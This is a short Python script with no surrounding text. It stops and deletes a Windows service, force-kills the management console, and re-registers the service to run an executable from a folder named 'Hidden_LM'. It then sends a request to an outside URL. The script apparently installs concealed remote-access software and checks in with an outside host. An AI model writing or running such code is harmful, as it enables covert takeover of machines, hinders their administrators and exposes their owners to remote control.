import requests
import os

os.system('net stop ROMService')
os.system('taskkill /F /IM mmc.exe')
os.system('sc delete ROMService')
os.system('sc create ROMService binpath=C:\\Hidden_LM\\ROMServer.exe')
os.system('ROMServer.exe /stop')
os.system('ROMServer.exe /start')

requests.get('https://maper.info/XXXXX')